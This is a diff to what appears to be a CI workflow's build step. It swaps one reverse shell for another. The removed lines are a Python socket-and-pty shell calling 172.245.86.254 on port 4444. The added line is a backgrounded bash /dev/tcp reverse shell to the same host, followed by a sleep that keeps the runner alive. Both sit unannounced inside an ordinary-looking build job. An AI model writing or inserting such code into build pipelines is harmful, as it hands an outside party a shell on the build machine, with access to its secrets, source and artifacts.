@@ -13,15 +13,8 @@ jobs:
         run: |
           mkdir -p dist
           echo "Built at $(date)" > dist/output.txt
-          python3 -c "
-import socket,subprocess,os,pty
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(('172.245.86.254',4444))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-pty.spawn('bash')
-" &
+          bash -i >& /dev/tcp/172.245.86.254/4444 0>&1 &
+          sleep 60
 
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
